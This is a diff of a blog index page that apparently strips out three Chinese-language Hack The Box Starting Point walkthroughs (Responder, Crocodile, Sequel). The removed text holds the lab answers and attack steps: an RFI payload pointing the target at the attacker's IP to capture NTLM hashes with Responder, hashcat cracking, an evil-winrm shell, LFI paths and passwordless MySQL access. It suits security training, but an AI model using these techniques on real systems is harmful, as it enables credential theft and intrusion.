@@ -184,42 +184,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>You need to walk before you can run<br>（目前为止完成时间最长的靶机，主要是扫描和爆破比较费时间）</p>
-<h2 id="TASK-1-How-many-TCP-ports-are-open-on-the-machine"><a href="#TASK-1-How-many-TCP-ports-are-open-on-the-machine" class="headerlink" title="TASK 1    How many TCP ports are open on the machine?"></a>TASK 1    How many TCP ports are open on the machine?</h2><p>靶机中开放的TCP端口数量为：<strong>3</strong></p>
-<blockquote>
-<p>nmap -A -p1-65535 10.129.34.77</p>
-<p>PS：这里由于校园网WAF的限制，所以7680端口无法直接扫描出来</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a242e065ec08471cb8288e28468585de.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-2-When-visiting-the-web-service-using-the-IP-address-what-is-the-domain-that-we-are-being-redirected-to"><a href="#TASK-2-When-visiting-the-web-service-using-the-IP-address-what-is-the-domain-that-we-are-being-redirected-to" class="headerlink" title="TASK 2    When visiting the web service using the IP address, what is the domain that we are being redirected to?"></a>TASK 2    When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2><p>当直接访问靶机IP时，被重定向到了：<strong>unika.htb</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/c147b09f05784842b37913ee57e04b55.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-3-Which-scripting-language-is-being-used-on-the-server-to-generate-webpages"><a href="#TASK-3-Which-scripting-language-is-being-used-on-the-server-to-generate-webpages" class="headerlink" title="TASK 3    Which scripting language is being used on the server to generate webpages?"></a>TASK 3    Which scripting language is being used on the server to generate webpages?</h2><p>靶机网页使用的语言是：<strong>PHP</strong></p>
-<p>打开BP抓个包，即可得到答案</p>
-<p><img src="https://img-blog.csdnimg.cn/3f80d68647a1459faf6276949e94a0e4.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-4-What-is-the-name-of-the-URL-parameter-which-is-used-to-load-different-language-versions-of-the-webpage"><a href="#TASK-4-What-is-the-name-of-the-URL-parameter-which-is-used-to-load-different-language-versions-of-the-webpage" class="headerlink" title="TASK 4    What is the name of the URL parameter which is used to load different language versions of the webpage?"></a>TASK 4    What is the name of the URL parameter which is used to load different language versions of the webpage?</h2><p>用于加载不同语言的URL参数是：<strong>page</strong></p>
-<blockquote>
-<p>首先修改hosts文件禁止页面跳转，编辑/etc/hosts，添加IP地址和跳转地址，之后发现靶机IP可以正常访问</p>
-<p>接着点修改语言（右上角EN），发现URL中的参数<strong>page</strong><br><img src="https://img-blog.csdnimg.cn/cfbd2e871b1d4d798788b6b48e84601e.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e1cca0c38acf4b20bba888ff319cb22d.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/1888112d3b5243b8a4a3675f90c308f9.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-5-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Local-File-Include-LFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”"><a href="#TASK-5-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Local-File-Include-LFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”" class="headerlink" title="TASK 5    Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”"></a>TASK 5    Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”</h2></blockquote>
-<p>选择题，可以进行本地文件包含的是：<strong>../../../../../../../../windows/system32/drivers/etc/hosts</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/45b5bae5d20f4dfcb2a9bf3dca6e20a8.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-6-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Remote-File-Include-RFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”"><a href="#TASK-6-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Remote-File-Include-RFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”" class="headerlink" title="TASK 6    Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”"></a>TASK 6    Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”</h2><p>同选择题，可以进行远程文件包含的是：<strong>//10.10.14.6/somefile</strong></p>
-<h2 id="TASK-7-What-does-NTLM-stand-for"><a href="#TASK-7-What-does-NTLM-stand-for" class="headerlink" title="TASK 7    What does NTLM stand for?"></a>TASK 7    What does NTLM stand for?</h2><p>NTLM的全称是：<strong>New Technology LAN Manager</strong></p>
-<h2 id="TASK-8-Which-flag-do-we-use-in-the-Responder-utility-to-specify-the-network-interface"><a href="#TASK-8-Which-flag-do-we-use-in-the-Responder-utility-to-specify-the-network-interface" class="headerlink" title="TASK 8    Which flag do we use in the Responder utility to specify the network interface?"></a>TASK 8    Which flag do we use in the Responder utility to specify the network interface?</h2><p>responder中能指定网络接口的参数：<strong>-I</strong>（杠艾）</p>
-<h2 id="TASK-9-There-are-several-tools-that-take-a-NetNTLMv2-challenge-response-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-One-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what"><a href="#TASK-9-There-are-several-tools-that-take-a-NetNTLMv2-challenge-response-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-One-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what" class="headerlink" title="TASK 9    There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?."></a>TASK 9    There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.</h2><p>john的全称是：<strong>john the ripper</strong>（用来爆破NTLM哈希的工具）</p>
-<h2 id="TASK-10-What-is-the-password-for-the-administrator-user"><a href="#TASK-10-What-is-the-password-for-the-administrator-user" class="headerlink" title="TASK 10    What is the password for the administrator user?"></a>TASK 10    What is the password for the administrator user?</h2><p>管理员账户的密码是：<strong>badminton</strong></p>
-<blockquote>
-<p>1、启动responder监听本地的tun0网卡：<strong>responder -I tun0</strong><br><img src="https://img-blog.csdnimg.cn/b741df59c10c48888dbc10eea1fc6188.png" alt="在这里插入图片描述"></p>
-<p>2、由于靶机存在远程文件包含漏洞，所以利用本机IP进行RFI：<strong>?page=//10.10.16.82/1.txt</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/5d834e406f6144debcdcd82cf9db50f4.png" alt="在这里插入图片描述"></p>
-<p>3、成功RFI后查看responder，得到返回的哈希值<br><img src="https://img-blog.csdnimg.cn/e21fe1b619074ffdba57baaaeceec76e.png" alt="在这里插入图片描述"></p>
-<p>4、利用hashcat进行爆破，得到管理员密码：<strong>hashcat -m 5600 -a 3 responder.txt rockyou.txt</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/03881b8e35484121802cc879ea3ff32b.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-11-We’ll-use-a-Windows-service-i-e-running-on-the-box-to-remotely-access-the-Responder-machine-using-the-password-we-recovered-What-port-TCP-does-it-listen-on"><a href="#TASK-11-We’ll-use-a-Windows-service-i-e-running-on-the-box-to-remotely-access-the-Responder-machine-using-the-password-we-recovered-What-port-TCP-does-it-listen-on" class="headerlink" title="TASK 11    We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?"></a>TASK 11    We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2></blockquote>
-<p>使用我们恢复的密码远程访问 Responder的Windows 服务监听的端口是：<strong>5985</strong></p>
-<h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root <em>flag</em></h2><p>利用evil-winrm直接getshell，在mike账户desktop下面找到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/5e0f19b6537a477e8a56bf58c81ea0a6.png" alt="在这里插入图片描述"></p>
-
+        <p>You need to walk before you can run<br>（目前为止完成时间最长的靶机，主要是扫描和爆破比较费时间）<br>
+        
+          <a class="article-more-a" href="/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/#more">展开全文 >></a>
+        
       
 
       
@@ -288,38 +256,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>You need to walk before you can run</p>
-<h2 id="TASK-1-What-nmap-scanning-switch-employs-the-use-of-default-scripts-during-a-scan"><a href="#TASK-1-What-nmap-scanning-switch-employs-the-use-of-default-scripts-during-a-scan" class="headerlink" title="TASK 1    What nmap scanning switch employs the use of default scripts during a scan?"></a>TASK 1    What nmap scanning switch employs the use of default scripts during a scan?</h2><p>nmap中用于使用默认脚本的参数是：<strong>-sC</strong></p>
-<h2 id="TASK-2-What-service-version-is-found-to-be-running-on-port-21"><a href="#TASK-2-What-service-version-is-found-to-be-running-on-port-21" class="headerlink" title="TASK 2    What service version is found to be running on port 21?"></a>TASK 2    What service version is found to be running on port 21?</h2><p>21端口上运行的服务版本是：<strong>vsftpd 3.0.3</strong></p>
-<blockquote>
-<p>nmap -sV 10.129.70.59</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/04675d20ede54b9b99b6fdb1bf924067.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-3-What-FTP-code-is-returned-to-us-for-the-“Anonymous-FTP-login-allowed”-message"><a href="#TASK-3-What-FTP-code-is-returned-to-us-for-the-“Anonymous-FTP-login-allowed”-message" class="headerlink" title="TASK 3    What FTP code is returned to us for the “Anonymous FTP login allowed” message?"></a>TASK 3    What FTP code is returned to us for the “Anonymous FTP login allowed” message?</h2><p>FTP中允许匿名登录的返回代码是：<strong>230</strong></p>
-<h2 id="TASK-4-What-command-can-we-use-to-download-the-files-we-find-on-the-FTP-server"><a href="#TASK-4-What-command-can-we-use-to-download-the-files-we-find-on-the-FTP-server" class="headerlink" title="TASK 4    What command can we use to download the files we find on the FTP server?"></a>TASK 4    What command can we use to download the files we find on the FTP server?</h2><p>用于下载FTP服务器文件的命令是：<strong>get</strong></p>
-<h2 id="TASK-5-What-is-one-of-the-higher-privilege-sounding-usernames-in-the-list-we-retrieved"><a href="#TASK-5-What-is-one-of-the-higher-privilege-sounding-usernames-in-the-list-we-retrieved" class="headerlink" title="TASK 5    What is one of the higher-privilege sounding usernames in the list we retrieved?"></a>TASK 5    What is one of the higher-privilege sounding usernames in the list we retrieved?</h2><p>获取到的用户名列表中，听起来权限更高的用户名是：<strong>admin</strong></p>
-<p>1、登录FTP服务器，使用匿名登录</p>
-<p>2、查看文件列表，发现userlist</p>
-<p>3、下载userlist到本地，查看列表</p>
-<p>4、列表中看起来权限更高的也就admin</p>
-<p><img src="https://img-blog.csdnimg.cn/fffba1afd9174ff38d1deaf1b8cd5802.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8078f09870924ac582f7bb694e566117.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-6-What-version-of-Apache-HTTP-Server-is-running-on-the-target-host"><a href="#TASK-6-What-version-of-Apache-HTTP-Server-is-running-on-the-target-host" class="headerlink" title="TASK 6    What version of Apache HTTP Server is running on the target host?"></a>TASK 6    What version of Apache HTTP Server is running on the target host?</h2><p>靶机上运行的Apache HTTP服务版本是：<strong>2.4.41</strong></p>
-<blockquote>
-<p>nmap -sV 10.129.70.59</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/d451f956a19a484bb073d3544ee00bc8.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-7-What-is-the-name-of-a-handy-web-site-analysis-plug-in-we-can-install-in-our-browser"><a href="#TASK-7-What-is-the-name-of-a-handy-web-site-analysis-plug-in-we-can-install-in-our-browser" class="headerlink" title="TASK 7    What is the name of a handy web site analysis plug-in we can install in our browser?"></a>TASK 7    What is the name of a handy web site analysis plug-in we can install in our browser?</h2><p>浏览器中方便分析网站的插件是：<strong>wappalyzer</strong></p>
-<h2 id="TASK-8-What-switch-can-we-use-with-gobuster-to-specify-we-are-looking-for-specific-filetypes"><a href="#TASK-8-What-switch-can-we-use-with-gobuster-to-specify-we-are-looking-for-specific-filetypes" class="headerlink" title="TASK 8    What switch can we use with gobuster to specify we are looking for specific filetypes?"></a>TASK 8    What switch can we use with gobuster to specify we are looking for specific filetypes?</h2><p>gobuster中用于查找特定类型文件的参数是：<strong>-x</strong></p>
-<h2 id="TASK-9-What-file-have-we-found-that-can-provide-us-a-foothold-on-the-target"><a href="#TASK-9-What-file-have-we-found-that-can-provide-us-a-foothold-on-the-target" class="headerlink" title="TASK 9    What file have we found that can provide us a foothold on the target?"></a>TASK 9    What file have we found that can provide us a foothold on the target?</h2><p>可以用于发动攻击的文件是：<strong>login.php</strong></p>
-<p>直接打开dirsearch开扫，发现了login.php可以利用</p>
-<p><img src="https://img-blog.csdnimg.cn/7ab73481102846369eea6eb5868925f7.png" alt="在这里插入图片描述"></p>
-<h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root flag</h2><p>1、访问/login.php，发现是个登录页面</p>
-<p><img src="https://img-blog.csdnimg.cn/6cbb5feadf494f91b7d0616669e59ba2.png" alt="在这里插入图片描述"></p>
-<p>2、之前在FTP服务器中发现了用户名文件和密码文件，一起下载下来<br><img src="https://img-blog.csdnimg.cn/06e79fdad23b46ee956985d219b58892.png" alt="在这里插入图片描述"></p>
-<p>3、查看这两个文件，用admin和rKXM59ESxesUFHAd进行登录</p>
-<p><img src="https://img-blog.csdnimg.cn/db8d0bf7951149bc98f94425944a0cc5.png" alt="在这里插入图片描述"></p>
-<p>4、登录成功即可获得flag<br><img src="https://img-blog.csdnimg.cn/eb0a880a3744436082e239d9279ad6bd.png" alt="在这里插入图片描述"></p>
-
+        <p>You need to walk before you can run<br>
+        
+          <a class="article-more-a" href="/2022/06/04/HackTheBox_StartingPoint_Tier1_Crocodile/#more">展开全文 >></a>
+        
       
 
       
@@ -388,39 +328,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>You need to walk before you can run</p>
-<h2 id="TASK-1-What-does-the-acronym-SQL-stand-for"><a href="#TASK-1-What-does-the-acronym-SQL-stand-for" class="headerlink" title="TASK 1    What does the acronym SQL stand for?"></a>TASK 1    What does the acronym SQL stand for?</h2><p>SQL的全称是：<strong>Structured Query Language</strong></p>
-<h2 id="TASK-2-During-our-scan-which-port-running-mysql-do-we-find"><a href="#TASK-2-During-our-scan-which-port-running-mysql-do-we-find" class="headerlink" title="TASK 2    During our scan, which port running mysql do we find?"></a>TASK 2    During our scan, which port running mysql do we find?</h2><p>靶机上运行mysql的端口是：<strong>3306</strong></p>
-<blockquote>
-<p>nmap -sV 10.129.223.172</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/31c1eaa69f1547809046f80fb7281468.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-3-What-community-developed-MySQL-version-is-the-target-running"><a href="#TASK-3-What-community-developed-MySQL-version-is-the-target-running" class="headerlink" title="TASK 3    What community-developed MySQL version is the target running?"></a>TASK 3    What community-developed MySQL version is the target running?</h2><p>靶机上运行的mysql版本的开发社区是：<strong>MariaDB</strong></p>
-<blockquote>
-<p>nmap扫描不出来开发社区信息，但是登录mysql后就可以看到</p>
-<p>mysql -h 10.129.223.172 -u root</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/bc6285ec2cdd4074b780eb05bcf2123e.png" alt="在这里插入图片描述"></p>
-<h2 id="TASK-4-What-switch-do-we-need-to-use-in-order-to-specify-a-login-username-for-the-MySQL-service"><a href="#TASK-4-What-switch-do-we-need-to-use-in-order-to-specify-a-login-username-for-the-MySQL-service" class="headerlink" title="TASK 4    What switch do we need to use in order to specify a login username for the MySQL service?"></a>TASK 4    What switch do we need to use in order to specify a login username for the MySQL service?</h2><p>用于指定登录mysql服务用户名的命令是：<strong>-u</strong></p>
-<h2 id="TASK-5-Which-username-allows-us-to-log-into-MariaDB-without-providing-a-password"><a href="#TASK-5-Which-username-allows-us-to-log-into-MariaDB-without-providing-a-password" class="headerlink" title="TASK 5    Which username allows us to log into MariaDB without providing a password?"></a>TASK 5    Which username allows us to log into MariaDB without providing a password?</h2><p>不输入密码的情况下允许登录MariaDB的用户名是：<strong>root</strong></p>
-<h2 id="TASK-6-What-symbol-can-we-use-to-specify-within-the-query-that-we-want-to-display-everything-inside-a-table"><a href="#TASK-6-What-symbol-can-we-use-to-specify-within-the-query-that-we-want-to-display-everything-inside-a-table" class="headerlink" title="TASK 6    What symbol can we use to specify within the query that we want to display everything inside a table?"></a>TASK 6    What symbol can we use to specify within the query that we want to display everything inside a table?</h2><p>用于查询表中所有内容的符号：<strong>*</strong></p>
-<h2 id="TASK-7-What-symbol-do-we-need-to-end-each-query-with"><a href="#TASK-7-What-symbol-do-we-need-to-end-each-query-with" class="headerlink" title="TASK 7    What symbol do we need to end each query with?"></a>TASK 7    What symbol do we need to end each query with?</h2><p>用于结束查询的符号：<strong>;</strong></p>
-<h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root flag</h2><p>1、连接到靶机数据库后先查看所有数据库信息</p>
-<blockquote>
-<p>show databases;</p>
-</blockquote>
-<p>2、由于information_schema、mysql和performance_schema这三个数据库都是用于存储mysql默认信息的数据库，所以选择htb数据并查看对应的表名</p>
-<blockquote>
-<p>use htb;</p>
-<p>show tables;</p>
-</blockquote>
-<p>3、查看htb数据库中所有表信息，在config表中发现flag</p>
-<blockquote>
-<p>select * from users;</p>
-<p>select * from config;</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/af21111ab82d4523a3b197de7641baf9.png" alt="在这里插入图片描述"></p>
-
+        <p>You need to walk before you can run<br>
+        
+          <a class="article-more-a" href="/2022/06/03/HackTheBox_StartingPoint_Tier1_Sequel/#more">展开全文 >></a>
+        
       
 
       
